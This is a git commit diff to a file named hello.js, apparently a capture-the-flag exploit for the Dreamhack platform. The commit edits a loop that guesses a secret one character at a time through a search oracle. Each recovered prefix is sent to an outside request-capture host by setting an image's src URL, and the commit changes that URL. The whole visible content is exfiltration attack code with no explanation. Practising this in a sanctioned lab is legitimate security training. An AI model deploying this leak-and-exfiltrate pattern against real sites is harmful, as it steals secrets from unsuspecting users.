c6e56cc6243e019a7ec5aa37f05784d4c8bb556e
ckdrnaos2 <72861176+ckdrnaos2@users.noreply.github.com>
2024-06-27 15:03:05 +0900

    Update hello.js

--- hello.js
+++ hello.js
@@ -33,7 +33,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://apgqbmq.request.dreamhack.games/${secret}`;
+                    img.src = `https://vvfqcnp.request.dreamhack.games/?c=${secret}`;
                     break;
                 }
             }
